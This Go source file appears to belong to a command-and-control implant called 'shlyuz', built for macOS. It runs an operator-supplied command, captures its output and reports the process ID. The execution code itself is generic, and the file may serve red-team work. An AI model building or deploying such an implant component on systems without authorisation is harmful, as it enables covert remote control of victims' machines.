//go:build darwin,implant && (!lp || !teamserver) // Darwin build tag

package firecollect

import (
	"bytes"
	"errors" 
	"fmt"    // For fmt.Errorf
	"io"
	"log"
	"os"
	"os/exec"
	"shlyuz/pkg/component"
	"strings" 
	"sync"    
)

// Execute runs the command specified by cmdDetails and collects its standard output in-memory.
// Standard error is captured and returned as part of an error if the command fails.
func Execute(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel) (string, error) {
	log.Printf("CmdID %s (Darwin): Preparing to execute and collect output for: %s", cmdDetails.Id, cmdDetails.Args)

	cmdArgs := strings.Split(cmdDetails.Args, " ")
	command := exec.Command(cmdArgs[0], cmdArgs[1:]...)
	log.Printf("CmdID %s (Darwin): Executing split command: %s, Args: %v", cmdDetails.Id, cmdArgs[0], cmdArgs[1:])


	// Create an in-memory pipe for stdout
	r, w, err := os.Pipe()
	if err != nil {
		log.Printf("CmdID %s (Darwin): Error creating stdout pipe: %v", cmdDetails.Id, err)
		return "", fmt.Errorf("failed to create stdout pipe for cmd %s (Darwin): %w", cmdDetails.Id, err)
	}
	command.Stdout = w

	// Capture stderr in a buffer
	var stderrBuf bytes.Buffer
	command.Stderr = &stderrBuf

	// Goroutine to read from the pipe's reader end
	var outputBuf bytes.Buffer
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer r.Close() 
		log.Printf("CmdID %s (Darwin): Starting to read from stdout pipe.", cmdDetails.Id)
		if _, copyErr := io.Copy(&outputBuf, r); copyErr != nil {
			log.Printf("CmdID %s (Darwin): Error copying stdout from pipe: %v", cmdDetails.Id, copyErr)
		}
		log.Printf("CmdID %s (Darwin): Finished reading from stdout pipe.", cmdDetails.Id)
	}()

	// Start the command
	if err := command.Start(); err != nil {
		log.Printf("CmdID %s (Darwin): Error starting command: %v", cmdDetails.Id, err)
		_ = w.Close() // Best effort close on error
		_ = r.Close() // Best effort close on error
		return "", fmt.Errorf("failed to start command %s (Darwin): %w. Stderr: %s", cmdDetails.Id, err, stderrBuf.String())
	}
	log.Printf("CmdID %s (Darwin): Command started successfully (PID: %d).", cmdDetails.Id, command.Process.Pid)
	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default:
			log.Printf("CmdID %s (Darwin): PID channel full, dropping PID for command %s", cmdDetails.Id, cmdDetails.Args)
		}
	}

	// Close the writer end of the pipe. This signals EOF to the reader goroutine when the command finishes.
	if err := w.Close(); err != nil {
		log.Printf("CmdID %s (Darwin): Error closing command's stdout pipe writer: %v", cmdDetails.Id, err)
	}

	// Wait for the command to finish
	waitErr := command.Wait()
	
	// Wait for the reader goroutine to finish processing all output.
	wg.Wait() 

	if waitErr != nil {
		log.Printf("CmdID %s (Darwin): Command finished with error: %v. Stderr: %s", cmdDetails.Id, waitErr, stderrBuf.String())
		errMsg := fmt.Sprintf("command %s (Darwin) finished with error: %v", cmdDetails.Id, waitErr)
		if stderrBuf.Len() > 0 {
			errMsg = fmt.Sprintf("%s. Stderr: %s", errMsg, stderrBuf.String())
		}
		return outputBuf.String(), errors.New(errMsg) // Return collected output along with error
	}

	log.Printf("CmdID %s (Darwin): Command finished successfully. Collected %d bytes of output.", cmdDetails.Id, outputBuf.Len())
	return outputBuf.String(), nil
}
